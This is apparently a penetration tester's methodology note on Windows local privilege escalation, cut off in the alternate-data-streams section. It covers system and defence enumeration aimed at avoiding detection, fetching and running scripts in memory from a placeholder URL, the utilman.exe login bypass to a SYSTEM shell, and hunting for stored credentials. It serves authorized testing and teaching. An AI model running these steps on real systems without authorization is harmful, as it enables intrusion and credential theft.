# Windows - Local privilege escalation

The following note assumes that a low privilege shell could be obtained on the
target.

To leverage a shell from a Remote Code Execution (RCE) vulnerability please
refer to the `[General] Shells` note.

“The more you look, the more you see.”  
― Pirsig, Robert M., Zen and the Art of Motorcycle Maintenance

### Basic enumeration

The following commands can be used to grasp a better understanding of the
current system:

|  | DOS | Powershell | WMI |
|--|-----|------------|-----|
| **Basic info** | `net config workstation` | `Get-ComputerInfo` | |
| **OS details**  | `systeminfo` | `[environment]::OSVersion.Version` |  |
| **OS Architecture** | `echo %PROCESSOR_ARCHITECTURE%` | `[Environment]::Is64BitOperatingSystem` | `wmic os get osarchitecture` |
| **Hostname**  | `hostname` | `$env:ComputerName` | `wmic computersystem  get name` <br> (PS) `(Get-WmiObject Win32_ComputerSystem).Name`|
| **Fully qualified hostname** | `net config workstation \| findstr /C:"Full Computer name"` | `[System.Net.Dns]::GetHostByName($env:computerName)` | |
| **Drives** | | `[System.IO.DriveInfo]::getdrives()` <br> `Get-PSDrive -PSProvider FileSystem` | |
| **Curent Domain** | `echo %userdomain%` | `$env:UserDomain` | (PS) `(Get-WmiObject Win32_ComputerSystem).Domain` |
| **Curent User** | `whoami /all` <br/> `net user %username%`  | `$env:UserName` | (PS) `(Get-WmiObject Win32_ComputerSystem).UserName` |
| **Local users** | `net users` <br/> `net users <USERNAME>` | `Get-LocalUser` | `wmic USERACCOUNT list full` <br> (PS) `Get-WMIObject Win32_UserAccount -NameSpace "root\CIMV2" -Filter "LocalAccount='$True'"` |
| **Local groups** | `net localgroup` | *(Win10+)* `Get-LocalGroup` | `wmic group list full` |
| **Local groups' member(s)** | `net localgroup Administrators` <br/> `net localgroup <GROUPNAME>` | `Get-LocalGroupMember -Name "<GROUPNAME>"` <br/><br/> `foreach ($group in Get-LocalGroup) { [PSCustomObject]@{ Group = $group.Name; User = (($group \| Get-LocalGroupMember).Name \| Out-String) } \| fl }` | |
| **Connected users** | `qwinsta` | | |
| **Powershell version**  | `Powershell  $psversiontable` | `$psversiontable` | |
| **Environement variables** | `set` | `Get-ChildItem Env: \| ft Key,Value` | |
| **Mounted disks** | `fsutil fsinfo drives` | `Get-PSDrive \| where {$_.Provider -like "Microsoft.PowerShell.Core\FileSystem"}` | `wmic volume get DriveLetter,FileSystem,Capacity` |
| **Writable directories** | `dir /a-rd /s /b` | | |
| **Writable files** | `dir /a-r-d /s /b` | | |
| **Processes** | `tasklist /v` | `Get-Process \| Ft Name,Id` | `wmic process get name,processid,executablepath,commandline,parentprocessid` <br/> (PS) `Get-WmiObject -Query "Select * from Win32_Process" \| where {$_.Name -notlike "svchost*"} \| Select Name, Handle, @{Label="Owner";Expression={$_.GetOwner().User}} \| ft -AutoSize` |
| **Processes command line** | | | `wmic process get Name,ProcessID,ExecutablePath` <br/> (PS) `Get-WmiObject win32_process \| Select Name,Handle,CommandLine \| Format-List` |
| **`TCP` / `UDP` network connections** | `netstat -anob` | `Get-NetTCPConnection` | |
| **User Account Control (UAC)** <br><br> `EnableLUA` = `0x1` -> `UAC` is enabled (default since `Windows Vista` / `Windows Server 2008`). <br><br> `LocalAccountTokenFilterPolicy` = `0x1` -> `UAC` remote restrictions are disabled (non default). <br><br> `FilterAdministratorToken` = `0x1` -> `UAC` is enforced for the local built-in `Administrator` account `RID` 500 (non default).  | `reg query HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v EnableLUA` <br><br> `reg query HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v LocalAccountTokenFilterPolicy` <br><br> `reg query HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v FilterAdministratorToken` | `Get-ItemProperty HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System -Name EnableLUA,LocalAccountTokenFilterPolicy,FilterAdministratorToken` | |

###### Installed .NET framework

A number of tools may require the use of .NET, either for privileges escalation
or post exploitation.

Before .NET 4.0, the installed .NET version can be determined using the
names of the folder in the `\Windows\Microsoft.NET\Framework64\` directory. For
later versions, the `MSBuild.exe` utility, packaged with the .NET  framework,
can be used to establish the precise version installed. If the execution of
`MSBuild.exe` is blocked, the version can still be retrieved manually.

```
cd \Windows\Microsoft.NET\Framework64\v4.0.30319
.\MSBuild.exe

# .NET 4.5 and later
# The "Release" DWORD key corresponds to the particular version of the .NET Framework installed
# Values of the Release DWORD: https://github.com/dotnet/docs/blob/master/docs/framework/migration-guide/how-to-determine-which-versions-are-installed.md
reg query "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\NET Framework Setup\NDP\v4\Full"

# .NET 1.1 through 3.5
# List all install versions (subkeys under NDP)
reg query HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\NET Framework Setup\NDP\
# Retrieve the "Version" key of the specified .NET installation
reg query HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\NET Framework Setup\NDP\<VERSION>

# Alternative .NET all versions
# The "FileVersion" property of the .NET installation dlls can be used to determine, through a Google search query, the precise installed version
cd \Windows\Microsoft.NET\Framework64\<VERSION>
Get-Item "Accessibility.dll" | fl
# Or
$file = Get-Item "Accessibility.dll"
[System.Diagnostics.FileVersionInfo]::GetVersionInfo($file).FileVersion
```

### Defense and supervision

Before attempting a local privilege escalation, notably in a covert scenario,
establishing a precise vision on the system security defense and supervision
mechanisms may help evade detection.  

###### Antivirus product

The `Windows Security Center` is a Windows component which, among other
features, keep track of the antivirus products installed on the system and
their status (monitoring mode and antivirus signatures update status). The
`Security Center` consolidates the `Windows Defender` status as well as third
party antivirus solutions by:
  - searching for registry keys and files provided to Microsoft by the
  antivirus software manufacturers
  - exposing a WMI provider on which antivirus software manufacturers can
  report their product status

Note that some `Endpoint Detection and Response (EDR)` solutions may not be
registered in the `SecurityCenter` and can only be detected by listing the
running processes or configured services.

```
# SecurityCenter: Windows 2000, Windows Server 2003, Windows XP, and older
# SecurityCenter2: Windows Vista, Windows Server 2008, or newer

Get-WmiObject -Namespace root\SecurityCenter2 -Class AntiVirusProduct | Ft displayName,productState,timestamp
WMIC /Node:localhost /Namespace:\rootSecurityCenter2 Path AntiVirusProduct Get displayName,productState,timestamp /Format:List
```

The `productState` property can be parsed and converted to a human readable
format using the following PowerShell code snippet:

```bash
$productState = "<PRODUCT_STATE>"

$hex = [Convert]::ToString($productState, 16).PadLeft(6,'0')

$WSC_SECURITY_PRODUCT_STATE = $hex.Substring(2,2)
$WSC_SECURITY_SIGNATURE_STATUS = $hex.Substring(4,2)

$RealTimeProtectionStatus = switch ($WSC_SECURITY_PRODUCT_STATE) {
  "00" {"OFF"}
  "01" {"EXPIRED"}
  "10" {"ON"}
  "11" {"SNOOZED"}
  default {"UNKNOWN"}
}

$DefinitionStatus = switch ($WSC_SECURITY_SIGNATURE_STATUS) {
  "00" {"UP_TO_DATE"}
  "10" {"OUT_OF_DATE"}
  default {"UNKNOWN"}
}

Write-Host "Real time protection status:" $RealTimeProtectionStatus
Write-Host "Signature update status:" $DefinitionStatus
```

###### Audit policies

The configured audit policies can be retrieved within the registry.

In particular, whether or not the command line is logged in process creation
events (`Security` hive, `4688: A new process has been created`) is of
importance, as a process command line arguments may yield information about a
tool function, compromised accounts or C2 servers, and be very able for the
blue team.

```
reg query "HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System\Audit"

# "ProcessCreationIncludeCmdLine_Enabled: 0x1" = the command line is logged in process creation
events
reg query "HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System\Audit" /v ProcessCreationIncludeCmdLine_Enabled
```

###### Windows Event Forwarding

`Windows Event Forwarding (WEF)` is a Microsoft Windows component that forwards
the chosen event logs to a `Windows Event Collector (WEC)` server, for back up
or security monitoring.

The following registry key can be queried to retrieve information about a
possible `WEF` subscription:  

```
reg query HKLM\Software\Policies\Microsoft\Windows\EventLog\EventForwarding\SubscriptionManager
```

###### AppLocker

`AppLocker` is a Windows native feature, added in Windows 7 Enterprise, that
allows, through the definition of rules, for the restriction and control of the
files users can execute.

The configured `AppLocker` rules are stored in multiple locations within the
registry and can also be retrieved using the `Get-AppLockerPolicy` PowerShell
cmdlet.

Note that the `appidsvc` service must be running for `AppLocker` to be
functional.

```
Get-AppLockerPolicy -Effective | Select-Object -ExpandProperty RuleCollections

# Configured AppLocker rules, stored in XML format
# The "EnforcementMode" subkey of each category (exe, scripts, MSI, Appx, DLL) corresponds to the enforcement status of the AppLocker rules of the category
# "EnforcementMode: 0x0" = Audit only
# "EnforcementMode: 0x1" = Enforce rules
reg query HKLM\Software\Policies\Microsoft\Windows\SrpV2 /s

# Mirror key
reg query HKLM\SOFTWARE\Wow6432Node\Policies\Microsoft\Windows\SrpV2 /s

HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Group Policy Objects\

# AppLocker pushed down from a Group Policy Object (GPO), stored in XML format
reg query HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Group Policy Objects\<GUID>Machine\Software\Policies\Microsoft\Windows\SrpV2

sc.exe query appidsvc
```

Additionally, the presence and size of the event logs hive
`Microsoft-Windows-AppLocker/EXE and DLL` can also be a good indicator of
whether or not `AppLocker` is enabled. If the log file is not present or is
empty (the evtx file has a size of 68 Ko / 69 632 bytes) then `AppLocker` may
not have been enabled and configured on the system.  

```
dir C:\Windows\System32\winevt\Logs | findstr /i AppLocker
```

For more information about `AppLocker`, refer to the
`Windows - Bypass AppLocker` note.

### Enumeration scripts

Most of the enumeration process detailed below can be automated using scripts.

*Personal preference: PEASS's `WinPEAS.exe` or `WinPEAS.bat` + PowerSploit's
`PowerUp.ps1` `Invoke-PrivescAudit` / `Invoke-AllChecks` + off-target
`Windows Exploit Suggester - Next Generation`*

To upload the scripts on the target, please refer to the `[General] File
transfer` note.

Note that PowerShell scripts can be injected directly into memory using
PowerShell `DownloadString` or through a `meterpreter` session:

```
powershell -nop -exec bypass -c "IEX (New-Object Net.WebClient).DownloadString('<URL_PS1>'); <Invoke-CMD>"

PS> IEX (New-Object Net.WebClient).DownloadString('<URL_PS1>')
PS> <Invoke-CMD>

meterpreter> load powershell
meterpreter> powershell_import <PS1_FILE_PATH>
meterpreter> powershell_execute <Invoke-CMD>
```

###### Privilege Escalation Awesome Scripts SUITE (PEASS) - WinPEAS

`WinPEAS` checks the local privilege escalation vectors defined in the
following checklist:
`https://book.hacktricks.xyz/windows/checklist-windows-privilege-escalation`.

Note that the `winPEAS.exe` executable requires the .NET 4.0 framework to
function. Alternatively, the `winPEAS.bat` script may be used instead (with no
coloring support and less optimization).

```
# All checks with out resource throttling
# Additionally specify "notcolor" to avoid formatting errors if ANSI coloring is not supported
winPEAS.exe cmd searchall searchfast

winPEAS.bat
```

###### PowerSploit's PowerUp

The PowerSploit's PowerUp `Invoke-PrivescAudit` / `Invoke-AllChecks` and
enjoiz's `privesc.bat` or `privesc.ps1`scripts run a number of configuration
checks:
  - Clear text passwords in files or registry  
  - Unquoted services path
  - Weak services permissions
  - "AlwaysInstallElevated" policy
  - Token privileges
  - ...

The `Invoke-PrivescAudit` / `Invoke-AllChecks` cmdlets will run all the checks
implemented by PowerSploit's `PowerUp.ps1`. The script can be either injected
directly into memory as specified above or can be imported using the file.

Note that `PowerUp` is not actively maintained in the master branch of the
`PowerShellMafia`'s `PowerSploit` GitHub repository.

```
# powershell.exe -nop -exec bypass
# set-executionpolicy bypass

Import-Module <FULLPATH>\PowerUp.ps1

# Older versions
Invoke-AllChecks

Invoke-PrivescAudit
```

###### enjoiz privesc.bat / privesc.ps1

Both the batch and PowerShell versions of the `enjoiz` privilege escalation
script require `accesschk.exe` to present on the targeted machine (on the
script directory). The script takes one or multiple user group(s) as parameter
to test the configuration for. To retrieve the user groups of the compromised
user, the Windows built-in `whoami /groups` can be used.

```
privesc.bat "<USER_GROUP_1>" ["<USER_GROUP_N"]

privesc.bat "Everyone Users" "Authenticated Users"
```   

###### Windows Exploit Suggester - Next Generation

The `WES-NG` script compares a targets patch levels against the Microsoft
vulnerability database in order to detect potential missing patches on the
target. Refer to the `Unpatched system` section below for a detailed usage
guide of the script.  

###### Seatbelt

`Seatbelt` is a C# tool that can be used to enumerate a number of security
mechanisms of the target such as the PowerShell restrictions, audit
and Windows Event Forwarding settings, registered antivirus, firewall
rules, installed patches and last reboot events, etc.

`Seatbelt` can also be used to gather interesting user data such as saved RDP
connections files and putty SSH host keys, AWS/Google/Azure cloud credential
files, browsers bookmarks and histories, etc.   

```
# Currently available (last update 20210511) SeatBelt commands  (+ means remote usage is supported):
    + AMSIProviders          - Providers registered for AMSI
    + AntiVirus              - Registered antivirus (via WMI)
    + AppLocker              - AppLocker settings, if installed
      ARPTable               - Lists the current ARP table and adapter information (equivalent to arp -a)
      AuditPolicies          - Enumerates classic and advanced audit policy settings
    + AuditPolicyRegistry    - Audit settings via the registry
    + AutoRuns               - Auto run executables/scripts/programs
    + ChromiumBookmarks      - Parses any found Chrome/Edge/Brave/Opera bookmark files
    + ChromiumHistory        - Parses any found Chrome/Edge/Brave/Opera history files
    + ChromiumPresence       - Checks if interesting Chrome/Edge/Brave/Opera files exist
    + CloudCredentials       - AWS/Google/Azure/Bluemix cloud credential files
    + CloudSyncProviders     - All configured Office 365 endpoints (tenants and teamsites) which are synchronised by OneDrive.
      CredEnum               - Enumerates the current user's saved credentials using CredEnumerate()
    + CredGuard              - CredentialGuard configuration
      dir                    - Lists files/folders. By default, lists users' downloads, documents, and desktop folders (arguments == [directory] [depth] [regex] [boolIgnoreErrors]
    + DNSCache               - DNS cache entries (via WMI)
    + DotNet                 - DotNet versions
    + DpapiMasterKeys        - List DPAPI master keys
      EnvironmentPath        - Current environment %PATH$ folders and SDDL information
    + EnvironmentVariables   - Current environment variables
    + ExplicitLogonEvents    - Explicit Logon events (Event ID 4648) from the security event log. Default of 7 days, argument == last X days.
      ExplorerMRUs           - Explorer most recently used files (last 7 days, argument == last X days)
    + ExplorerRunCommands    - Recent Explorer "run" commands
      FileInfo               - Information about a file (version information, timestamps, basic PE info, etc. argument(s) == file path(s)
    + FileZilla              - FileZilla configuration files
    + FirefoxHistory         - Parses any found FireFox history files
    + FirefoxPresence        - Checks if interesting Firefox files exist
    + Hotfixes               - Installed hotfixes (via WMI)
      IdleTime               - Returns the number of seconds since the current user's last input.
    + IEFavorites            - Internet Explorer favorites
      IETabs                 - Open Internet Explorer tabs
    + IEUrls                 - Internet Explorer typed URLs (last 7 days, argument == last X days)
    + InstalledProducts      - Installed products via the registry
      InterestingFiles       - "Interesting" files matching various patterns in the user's folder. Note: takes non-trivial time.
    + InterestingProcesses   - "Interesting" processes - defensive products and admin tools
      InternetSettings       - Internet settings including proxy configs and zones configuration
      KeePass                - Finds KeePass configuration files
    + LAPS                   - LAPS settings, if installed
    + LastShutdown           - Returns the DateTime of the last system shutdown (via the registry).
      LocalGPOs              - Local Group Policy settings applied to the machine/local users
    + LocalGroups            - Non-empty local groups, "-full" displays all groups (argument == computername to enumerate)
    + LocalUsers             - Local users, whether they're active/disabled, and pwd last set (argument == computername to enumerate)
    + LogonEvents            - Logon events (Event ID 4624) from the security event log. Default of 10 days, argument == last X days.
    + LogonSessions          - Windows logon sessions
      LOLBAS                 - Locates Living Off The Land Binaries and Scripts (LOLBAS) on the system. Note: takes non-trivial time.
    + LSASettings            - LSA settings (including auth packages)
    + MappedDrives           - Users' mapped drives (via WMI)
      McAfeeConfigs          - Finds McAfee configuration files
      McAfeeSiteList         - Decrypt any found McAfee SiteList.xml configuration files.
      MicrosoftUpdates       - All Microsoft updates (via COM)
      NamedPipes             - Named pipe names and any readable ACL information.
    + NetworkProfiles        - Windows network profiles
    + NetworkShares          - Network shares exposed by the machine (via WMI)
    + NTLMSettings           - NTLM authentication settings
      OfficeMRUs             - Office most recently used file list (last 7 days)
      OracleSQLDeveloper     - Finds Oracle SQLDeveloper connections.xml files
    + OSInfo                 - Basic OS info (i.e. architecture, OS version, etc.)
    + OutlookDownloads       - List files downloaded by Outlook
    + PoweredOnEvents        - Reboot and sleep schedule based on the System event log EIDs 1, 12, 13, 42, and 6008. Default of 7 days, argument == last X days.
    + PowerShell             - PowerShell versions and security settings
    + PowerShellEvents       - PowerShell script block logs (4104) with sensitive data.
    + PowerShellHistory      - Searches PowerShell console history files for sensitive regex matches.
      Printers               - Installed Printers (via WMI)
    + ProcessCreationEvents  - Process creation logs (4688) with sensitive data.
      Processes              - Running processes with file info company names that don't contain 'Microsoft', "-full" enumerates all processes
    + ProcessOwners          - Running non-session 0 process list with owners. For remote use.
    + PSSessionSettings      - Enumerates PS Session Settings from the registry
    + PuttyHostKeys          - Saved Putty SSH host keys
    + PuttySessions          - Saved Putty configuration (interesting fields) and SSH host keys
      RDCManFiles            - Windows Remote Desktop Connection Manager settings files
    + RDPSavedConnections    - Saved RDP connections stored in the registry
    + RDPSessions            - Current incoming RDP sessions (argument == computername to enumerate)
    + RDPsettings            - Remote Desktop Server/Client Settings
      RecycleBin             - Items in the Recycle Bin deleted in the last 30 days - only works from a user context!
      reg                    - Registry key values (HKLM\Software by default) argument == [Path] [intDepth] [Regex] [boolIgnoreErrors]
      RPCMappedEndpoints     - Current RPC endpoints mapped
    + SCCM                   - System Center Configuration Manager (SCCM) settings, if applicable
    + ScheduledTasks         - Scheduled tasks (via WMI) that aren't authored by 'Microsoft', "-full" dumps all Scheduled tasks
      SearchIndex            - Query results from the Windows Search Index, default term of 'passsword'. (argument(s) == <search path> <pattern1,pattern2,...>
      SecPackageCreds        - Obtains credentials from security packages
      SecurityPackages       - Enumerates the security packages currently available using EnumerateSecurityPackagesA()
      Services               - Services with file info company names that don't contain 'Microsoft', "-full" dumps all processes
    + SlackDownloads         - Parses any found 'slack-downloads' files
    + SlackPresence          - Checks if interesting Slack files exist
    + SlackWorkspaces        - Parses any found 'slack-workspaces' files
    + SuperPutty             - SuperPutty configuration files
    + Sysmon                 - Sysmon configuration from the registry
    + SysmonEvents           - Sysmon process creation logs (1) with sensitive data.
      TcpConnections         - Current TCP connections and their associated processes and services
      TokenGroups            - The current token's local and domain groups
      TokenPrivileges        - Currently enabled token privileges (e.g. SeDebugPrivilege/etc.)
    + UAC                    - UAC system policies via the registry
      UdpConnections         - Current UDP connections and associated processes and services
      UserRightAssignments   - Configured User Right Assignments (e.g. SeDenyNetworkLogonRight, SeShutdownPrivilege, etc.) argument == computername to enumerate
    + WindowsAutoLogon       - Registry autologon information
      WindowsCredentialFiles - Windows credential DPAPI blobs
    + WindowsDefender        - Windows Defender settings (including exclusion locations)
    + WindowsEventForwarding - Windows Event Forwarding (WEF) settings via the registry
    + WindowsFirewall        - Non-standard firewall rules, "-full" dumps all (arguments == allow/deny/tcp/udp/in/out/domain/private/public)
      WindowsVault           - Credentials saved in the Windows Vault (i.e. logins from Internet Explorer and Edge).
      WMIEventConsumer       - Lists WMI Event Consumers
      WMIEventFilter         - Lists WMI Event Filters
      WMIFilterBinding       - Lists WMI Filter to Consumer Bindings
    + WSUS                   - Windows Server Update Services (WSUS) settings, if applicable

# Conduct system + user checks, with fully detailed results
SeatBelt.exe <Command> [Command2] [-full]
SeatBelt.exe -group=all [-full]

# Executes SeatBelt from memory (as a gzip-compressed and base64-encoded .Net assembly loaded in PowerShell).
# From PowerSharpBinaries https://github.com/S3cur3Th1sSh1t/PowerSharpPack/
IEX(New-Object Net.WebClient).DownloadString("http://<HOSTNAME | IP>[:<PORT>]/<SCRIPT>")
Invoke-Seatbelt -Command "<Command> [Command2] [-full]"
```

### Physical access privileges escalation

Physical access open up different ways to bypass user login screen and obtain
`NT AUTHORITY\SYSTEM` access.

###### Hardened system

*BIOS settings*

The methods detailed below require to boot from a live CD/DVD or USB key. The
possibility to do so may be disabled by BIOS settings. To conduct the
attack below, an access to the BIOS or a reset to default settings must be
accomplished.  

Manufacturers may have defined a default BIOS password, some of which are
listed on the following resource
http://www.uktsupport.co.uk/reference/biosp.htm

Ultimately, BIOS settings can be reseted by removing the CMOS battery or using
the motherboard Jumper. The system hard drive can also be plugged on another
computer to extract the SAM base or carry out the process below.  

*Encrypted disk*

The methods detailed below require an access to the Windows file system and will
not work on encrypted partitions if the password to decrypt the file system is
not known.

###### PCUnlocker

`PCUnlocker` is a password-unlocking software that can be used to reset lost
Windows users password. it can be burn on a CD/DVD or installed on a bootable
USB key.

The procedure to create a bootable USB key and reset local Windows users
passwords is as follow:

  1. Download `Rufus` and `PCUnlocker`
  2. Create a bootable USK key using `Rufus` with the `PCUnlocker` ISO.  
     If making an USB key for a computer with UEFI BIOS, pick the "GPT partition
     scheme for UEFI computer" option on Rufus
  3. Boot on the USB Key thus created (boot order may need to be changed in
     BIOS)
  4. From the `PCUnlocker` GUI, pick an account and click the "Reset Password"
     button to reset the password to <PASSWORD>

To create a bootable CD/DVD, simply use any CD/DVD burner with the `PCUnlocker`
ISO and follow steps 3 & 4.  
If used on a Domain Controller, `PCUnlocker` can be used to reset Domain users
password by updating the `ntds.dit` file.

###### utilman.exe

The `utilman` utility tool can be launched at the login screen before
authentication as NT AUTHORITY\SYSTEM. By using a Windows installation CD/DVD,
it is possible to replace the `utilman.exe` by `cmd.exe` to gain access to a CMD
shell as SYSTEM without authentication.

The procedure to do so is as follow:

  1. Download the Windows ISO corresponding to the attacked system and burn it
     to a CD/DVD
  2. Boot on the thus created CD/DVD
  3. Pick the "Repair your computer" option
  4. Select the “Use recovery tools [...]" option, pick the operating system
     from the list and click "Next"
  5. A command prompt should open, enter the following commands:
      - `cd windows\system32`
      - `ren utilman.exe utilman.exe.bak`
      - `copy cmd.exe utilman.exe`
  6. Remove the CD/DVD and boot the system normally.
  7. On the login screen, press the key combination Windows Key + U
  8. A command prompt should open with NT AUTHORITY\SYSTEM rights
  9. Change a user password (net user <USERNAME> <NEWPASSWORD>) or create a new
  user

### Sensible content

###### Clear text passwords in files

The built-in `findstr` and `dir` can be used to search for clear text passwords
stored in files. The keyword 'password' should be used first and the search
broaden if needed by searching for 'pass'.

The `meterpreter` `search` command can be used in place of `findstr` if a
`meterpreter` shell is being used.

```
# Searches recursively in current folder
dir /s <KEYWORD>

# Meterpreter search command
search -f <FILE_NAME>.<FILE_EXTENSION> <KEYWORD>
search -f *.* <KEYWORD>

# Search (case insensitive) the specified keyword (for example 'password' or 'pass') in all or all the files of a given extension.
# The findstr is a Windows utility usable in a DOS shell. Get-ChildItem is a (faster) PowerShell cmdlet.
# A case sensitive search can be conducted using 's findstr /spin option or Get-Select-String's -CaseSensitive switch.

Get-ChildItem -ErrorAction SilentlyContinue -Recurse | Select-String "<KEYWORD>" -List | Select-Object -ExpandProperty Path
findstr /si "<KEYWORD>" *.*

Get-ChildItem -ErrorAction SilentlyContinue -Recurse -Filter <*.txt | *.<EXTENSION>> | Select-String "<KEYWORD>" -List | Select-Object -ExpandProperty Path
findstr /si "<KEYWORD>" <*.txt | *.<EXTENSION>>

# Search for runas with savecred in files
findstr /s /i /m "savecred" *.*
findstr /s /i /m "runas" *.*

# Find all those strings in config files.
dir /s *pass* == *cred* == *vnc* == *.config*
```

The following files, if present on the system, may contain clear text or base64
encoded passwords and should be reviewed:

```
%WINDIR%\Panther\Unattend\Unattended.xml
%WINDIR%\Panther\Unattend\Unattend.xml
%WINDIR%\Panther\Unattended.xml
%WINDIR%\Panther\Unattend.xml
%SystemDrive%\sysprep.inf
%SystemDrive%\sysprep\sysprep.xml
%WINDIR%\system32\sysprep\Unattend.xml
%WINDIR%\system32\sysprep\Panther\Unattend.xml
%SystemDrive%\MININT\SMSOSD\OSDLOGS\VARIABLES.DAT
%WINDIR%\panther\setupinfo
%WINDIR%\panther\setupinfo.bak
%SystemDrive%\unattend.xml
%WINDIR%\system32\sysprep.inf
%WINDIR%\system32\sysprep\sysprep.xml
%WINDIR%\Microsoft.NET\Framework64\v4.0.30319\Config\web.config
%SystemDrive%\inetpub\wwwroot\web.config
%AllUsersProfile%\Application Data\McAfee\Common Framework\SiteList.xml
%HOMEPATH%\AppData\Local\Packages\CanonicalGroupLimited.Ubuntu<...>\LocalState\rootfs\etc\passwd
%HOMEPATH%\AppData\Local\Packages\CanonicalGroupLimited.Ubuntu<...>\LocalState\rootfs\etc\shadow

dir c:\*vnc.ini /s /b
dir c:\*ultravnc.ini /s /b
dir c:\ /s /b | findstr /si *vnc.ini
dir /s /b *tnsnames*
dir /s /b *.ora*
```

###### Cached credentials

Windows-based computers use multiple forms of password caching / storage: local
accounts credentials, domain credentials, and generic credentials:

  - Domain credentials are authenticated by the Local Security Authority (LSA)
    and cached in the LSASS (Local Security Authority Subsystem) process.
  - Local accounts credentials are stored in the SAM (Security Account Manager)
    hive.
  - Generic credentials are defined programs that manage authorization and
    security directly. The generic credentials are cached in the Windows
    Credential Manager.

Local administrator or `NT AUTHORITY\SYSTEM` privileges are required to access
the clear-text or hashed passwords. Refer to the `[Windows] Post
Exploitation` note for more information on how to retrieve these credentials.

However, stored generic credentials may be directly usable. In particular,
Windows credentials (domain or local accounts) cached as generic credentials in
the Credential Manager, usually done using `runas /savecred`.   

The `cmdkey` and `rundll32.exe` Windows built-ins can be used to enumerate the
generic credentials stored on the machine. Saved Windows credentials be can used
using `runas`.

```
# List stored generic credentials
cmdkey /list
# Require a GUI interface
rundll32.exe keymgr.dll,KRShowKeyMgr

runas /savecred /user:<DOMAIN | WORKGROUP>\<USERNAME> <EXE>
```

###### Cached GPP passwords

GPP can be cached locally and may contain encrypted passwords that can be
decrypted using the Microsoft public AES key.

The `Get-CachedGPPPassword` cmdlet, of the `PowerSploit`'s `PowerUp` script,
can be used to automatically retrieve the cached GPP XML files and extract the
present passwords.

```
Get-CachedGPPPassword
```

The following commands can be used to conduct the search manually:

```
$AllUsers = $Env:ALLUSERSPROFILE
# If $AllUsers do not contains "ProgramData"
$AllUsers = "$AllUsers\Application Data"

Get-ChildItem -Path $AllUsers -Recurse -Include 'Groups.xml','Services.xml','Scheduledtasks.xml',
'DataSources.xml','Printers.xml','Drives.xml' -Force -ErrorAction SilentlyContinue | Select-String -pattern "cpassword"
```

The Ruby `gpp-password` script can be used to decrypt a GPP password:

```
gpp-decrypt <ENC_PASSWORD>
```

###### Clear text password in registry

Passwords may also be stored in Windows registry:

```
# Windows autologin
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon"

# VNC
reg query "HKCU\Software\ORL\WinVNC3\Password"
reg query HKEY_LOCAL_MACHINE\SOFTWARE\RealVNC\WinVNC4 /v password

# SNMP Paramters
reg query "HKLM\SYSTEM\Current\ControlSet\Services\SNMP"

# Putty
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions"

# Search for password in registry
reg query HKLM /f password /t REG_SZ /s
reg query HKCU /f password /t REG_SZ /s
reg query HKLM /f pass /t REG_SZ /s
reg query HKCU /f pass /t REG_SZ /s
```

###### Wifi passwords

The configured / memorized Wifi passwords on the target machine may be
retrievable as an unprivileged user using the Windows built-in `netsh`:

```
# List stored Wifi
netsh wlan show profiles

# Retrieve information about the specified Wifi, including its clear text password if available
netsh wlan show profile name="<WIFI_NAME>" key=clear
```

###### Passwords in Windows event logs

If the compromised user can read Windows events logs, by being a member
of the `Event Log Readers` notably, and the command-line auditing feature is
enabled, the logs should be reviewed for sensible information.

```
# Check if command-line auditing is enabled - may return false-negative
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System\Audit /v ProcessCreationIncludeCmdLine_Enabled

# List available Windows event logs type and number of entries
Get-EventLog -List

Get-EventLog -LogName <System | Security | ...> | Select -Property * -ExpandProperty Message

wevtutil qe <System | Security | ...> /f:text /rd:true

# specifying an host allows to specify an user to run the query as
wevtutil qe <System | Security | ...> /r:<127.0.0.1 | HOSTNAME | IP> /u:<WORKGROUP | DOMAIN>\<USERNAME> /p:<* | PASSWORD> /f:text /rd:true
```

###### Recently modified files

Recently modified files can be of interest and may contain sensitive
information. For example, the lastly modified files in a product installation
folder may correspond to the non default modifications and configuration.

The time of modification may also be of interest in a `CTF` scenarios.

```bash
# Lists the files and folders modified the last <DAYS> days.
Get-ChildItem [-File] -ErrorAction SilentlyContinue -Force -Recurse <PATH> | Where { $_.LastWriteTime -gt (Get-Date).AddDays(-<DAYS>) } | Format-Table LastWriteTime,FullName

# Lists the files and folders modified between the specifed dates.
Get-ChildItem [-File] -ErrorAction SilentlyContinue -Force -Recurse <PATH> | Where { $_.lastwritetime -gt '<FIRST_MM/DD/YYYY>' -AND $_.lastwritetime -lt '<LAST_MM/DD/YYYY>' } | Format-Table LastWriteTime,FullName
```

###### Hidden files

To display only hidden files, the following command can be used:

```
dir /s /ah /b
dir C:\ /s /ah /b

# PowerShell
ls -r
Get-Childitem -Recurse -Hidden
```

###### Files of interest

The following files may contains sensible information:

```
# PowerShell commands history
%userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt

# WSL directory - For more information refer to Windows Subsystem for Linux (WSL) below
%HOMEPATH%\AppData\Local\Packages\CanonicalGroupLimited.Ubuntu<...>
```

###### Alternate data streams (ADS)

The NTFS file system includes support for ADS, allowing files to contain more
than one stream of data. Every Windows file has at least one data stream,
called by default `:$DATA`.

ADS do not appear in Windows Explorer, and their size is not included in the
size of the file that hosts them. Moreover, only the main stream of a file is
retained when copying to a FAT file system, attaching to a mail or
uploading to a website. Because of these properties, ADS may be used by users
or applications to store sensible information and the eventual ADS present on
the system should be reviewed.

DOS and PowerShell built-ins as well as `streams.exe` from the Sysinternals
suite and tools from
http://www.flexhex.com/docs/articles/alternate-streams.phtml can be used to
operate with ADS.

Note that the PowerShell cmdlets presented below are only available starting
from `PowerShell 3`.

```
# Search ADS
dir /R <DIRECTORY | FILE_NAME>
gci -recurse | % { gi $_.FullName -stream * } | where stream -ne ':$DATA'
